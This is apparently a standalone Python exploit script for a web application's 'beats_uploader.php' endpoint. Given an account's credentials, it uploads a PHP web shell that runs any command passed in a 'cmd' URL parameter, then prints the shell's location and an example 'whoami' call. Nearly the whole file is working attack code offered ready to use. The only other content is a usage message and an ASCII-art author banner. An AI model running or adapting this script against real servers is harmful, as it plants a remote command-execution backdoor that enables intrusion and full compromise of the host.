import requests
import sys
import base64
import json

def b64encode(s):
    return base64.b64encode(s.encode()).decode()

def helpmenu():
	print("(+) Usage:\t python %s <DomainURL> <USER> <PASS>" % sys.argv[0])
	sys.exit(-1)

def header():
	header = '''
          ==/           i     i           \==_
        /XX/            |\___/|            \XX\2
      /XXXX\            |XXXXX|            /XXXX\3
     |XXXXXX\_         _XXXXXXX_         _/XXXXXX|
    XXXXXXXXXXXxxxxxxxXXXXXXXXXXXxxxxxxxXXXXXXXXXXX
   |XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX|
   XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
   |XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX|
    XXXXXX/^^^^"\XXXXXXXXXXXXXXXXXXXXX/^^^^^\XXXXXX
     |XXX|       \XXX/^^\XXXXX/^^\XXX/       |XXX|
       \XX\       \X/    \XXX/    \X/       /XX/
          "\       "      \X/      "      /"
                                     
                                      Autor: AbelJM
                              Web: abeljm.github.io
	'''
	print(header)


if __name__ == "__main__":

	header()

	try:

		url = sys.argv[1]
		user = sys.argv[2]
		passw = sys.argv[3]

		creds64 = b64encode("%s:%s" % (user,passw))
		upload_url = "http://" + url + "/actions/beats_uploader.php"


		s = requests.Session()

		headers = {

		"Host": url,
		"Authorization": "Basic " + creds64,
		"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0",
		"Accept": "*/*",
		}

		shell     = {
		            'file': 
		              (
		                'shell.php', 
		                '<?php echo shell_exec($_GET["cmd"]); ?>', 
		                'application/octet-stream', 
		                {'Content-Disposition': 'form-data'}
		              ) 
		            }

		fdata   = {'plupload': '1',
		          'name': 'shell.php'
		          }

		r1 = s.post(url=upload_url, files=shell, data=fdata, headers=headers, verify=False)

		response = r1.json()

		if response["success"] == 'yes':

			directory = response["file_directory"]
			file_name = response["file_name"]
			ext = response["extension"]
			
			print("[*] Good Job!!")
			print("[*] Shell Uploaded!!\n")
			print("[+] Path Shell: http://%s/actions/%s/%s.%s" % (url, directory, file_name, ext))
			print("\n[+] Example Run Shell: http://%s/actions/%s/%s.%s?cmd=whoami\n" % (url, directory, file_name, ext))

	except IndexError:
		helpmenu()		